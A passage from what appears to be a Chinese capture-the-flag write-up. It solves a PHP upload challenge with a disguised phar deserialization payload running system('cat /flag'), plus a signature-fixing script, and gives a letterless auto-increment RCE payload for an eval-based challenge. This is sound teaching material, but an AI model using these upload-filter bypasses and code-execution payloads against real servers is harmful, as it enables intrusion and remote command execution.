punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"size\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$extension</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$allowedExts</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$content</span><span class=\"token operator\">=</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$pos</span> <span class=\"token operator\">=</span> <span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"__HALT_COMPILER();\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">gettype</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pos</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"integer\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"ltj一眼就发现了phar\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"./upload/\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" 文件已经存在\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token variable\">$myfile</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"./upload/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"w\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$myfile</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$myfile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"上传成功 ./upload/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"dky不喜欢这个文件 .\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$extension</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>同样对上传的文件进行了 gif、jpeg、jpg、png 的后缀名检测， 并且在上传的文件内容中搜索__HALT_COMPILER (); 第一次出现的位置，搜索到即 echo 发现 phar，否则如果文件不存在则上传成功。</p>\n<p>除此之外还对 phar 文件内容进行检测，要求不能存在</p>\n<p>&quot;__HALT_COMPILER();&quot;</p>\n<p>可以将文件压缩为 zip 文件，并把后缀改为 png 文件，这样文件内容和后缀白名单检测都绕过了</p>\n<p>然后由于需要绕过 wakeup，因为是后面自己去改的数据，而 <code>phar</code>  文件的签名是第一次生成文件的时候自动生成的，所以当我们修改数据过后，由于签名错误，这个 <code>phar</code>  是无法被正常解析的，所以需要修改签名，让他变成一个正常的 phar 文件还需要对 phar 文件进行修改</p>\n<p>以下为脚本：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">LoveNss</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$ljt</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"Misc\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dky</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"Re\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"system('cat /flag');\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">LoveNss</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># 下面这部分就没改</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$phar</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Phar</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"phar.phar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;?php __HALT_COMPILER(); ?>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 设置 stub</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将自定义的 meta-data 存入 manifest</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 添加要压缩的文件</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">// 签名自动计算</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>from hashlib import sha1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>with <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'phar.phar'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> file<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    f <span class=\"token operator\">=</span> file<span class=\"token operator\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s <span class=\"token operator\">=</span> f<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">28</span><span class=\"token punctuation\">]</span> <span class=\"token comment\"># 获取要签名的数据</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>h <span class=\"token operator\">=</span> f<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token comment\"># 获取签名类型和 GBMB 标识</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>newf <span class=\"token operator\">=</span> s <span class=\"token operator\">+</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">digest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> h <span class=\"token comment\"># 数据 + 签名 + (类型 + GBMB)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>with <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'newtest.phar'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> file<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    file<span class=\"token operator\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>newf<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 写入新文件</span></pre></td></tr></table></figure><p>改完签名后，再压缩成 zip，最后改为.jpg 的后缀，来绕过__HALT_COMPILER ();</p>\n<pre><code>&lt;?php\nsystem(&quot;gzip newtest.phar&quot;);\n\n// 将压缩后的1.phar文件重命名为1.jpg\nrename(&quot;newtest.phar.gz&quot;, &quot;1.jpg&quot;);\n</code></pre>\n<p>然后查看 phar://upload/1.jpg，即可获取 flag。</p>\n<h2 id=\"20231218\"><a class=\"anchor\" href=\"#20231218\">#</a> 2023/12/18</h2>\n<h3 id=\"swpuctf-2021-新生赛hardrce_3\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛hardrce_3\">#</a> [SWPUCTF 2021 新生赛] hardrce_3</h3>\n<h4 id=\"无字母rce自增绕过diable_function绕过open_basedir绕过\"><a class=\"anchor\" href=\"#无字母rce自增绕过diable_function绕过open_basedir绕过\">#</a> 无字母 rce，自增绕过，diable_function 绕过，open_basedir 绕过</h4>\n<p>进入题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Content-Type:text/html;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'wllm'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$wllm</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'wllm'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$blacklist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\^'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\~'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\|'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$blacklist</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$blackitem</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$blackitem</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/m'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$wllm</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"小伙子只会异或和取反？不好意思哦LTLT说不能用！！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[a-zA-Z0-9]/is'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$wllm</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Ra'sAlGhul说用字母数字是没有灵魂的！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"NoVic4说：不错哦小伙子，可你能拿到flag吗？\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$wllm</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"蔡总说：注意审题！！！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token delimiter important\">?></span></span> 蔡总说：注意审题！！！</pre></td></tr></table></figure><p>关于无字母 rce，可以参考这两篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcHVyc3VlLXNlY3VyaXR5L3AvMTU0MDQxNTAuaHRtbA==\">RCE 篇之无数字字母 rce</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYxNzc4MTI4L2FydGljbGUvZGV0YWlscy8xMjcwNjM0MDc=\">无数字字母 rce 总结（取反、异或、自增、临时文件）</span></p>\n<p>这里我们:</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?wllm=<span class=\"token variable\">$_</span>=[]<span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span>=@<span class=\"token string\">\"$_\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span>=<span class=\"token variable\">$_</span>[<span class=\"token string\">'!'</span>==<span class=\"token string\">'@'</span>]<span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span>=<span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>=<span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span>.=<span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span>.=<span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>=<span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span>.=<span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>=<span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span>.=<span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>=<span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span>.=<span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$____</span>=<span class=\"token string\">'_'</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>=<span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$____</span>.=<span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>=<span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$____</span>.=<span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>=<span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$____</span>.=<span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>=<span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token 